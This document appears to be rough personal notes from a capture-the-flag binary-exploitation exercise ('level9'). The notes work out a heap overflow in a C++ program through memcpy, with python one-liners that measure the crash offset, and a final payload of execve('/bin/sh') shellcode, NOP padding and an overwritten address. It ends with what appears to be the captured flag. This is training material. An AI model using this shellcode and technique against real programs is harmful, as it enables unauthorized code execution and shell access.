
About 109 to crash it

1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
It is du to two object being allocated, each of 108 bytes


Ok so this time this is a c++ executable.

There is no call to /bin/sh so we can safely assume that we need to inject some shellcode

We can see that there is a call to strlen as well as a memcopy call, since memcpy is not protected we will want to inject some shellcode over there, overwrite the return ptr to the block with the shellcode inside of it

By using ltrace we can see that the target address of memcpy is always the same,

memcpy(0x0804a00c, "aaaa", 4) = 0x0804a00c


So as in level2, the payload need to look like this :
Shellcode + padding + return address

Let's try and use the same as last time 

\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80 ; 21 len


But first let's find the proper offset

We can see in the code that our object is allocated for a size of 




ltrace ./level9 $(python -c 'print("a" * 108)')

does not crash but 109 does


0x 08 04 a0 1c
// 21 + 4 - 109
$(python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "a" * 84 + "\x0c\xa0\x04\x08")

But first lets make it crash on basic aaa


This does not crash at all
$(python -c 'print("a" * 104 + "\x0c\xa0\x04\x08")')



$(python -c 'print("a" * 108 + "\x0c\xa0\x04\x08")')
0x61616161 in ?? ()


$(python -c 'print("a" * 108 + "\x0c\xa0\x04\x08")')
0x61616161 in ?? ()





r $(python -c 'print("b" * 4 + "a" * 104 + "\x0c\xa0\x04\x08")')

r $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08")')

f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728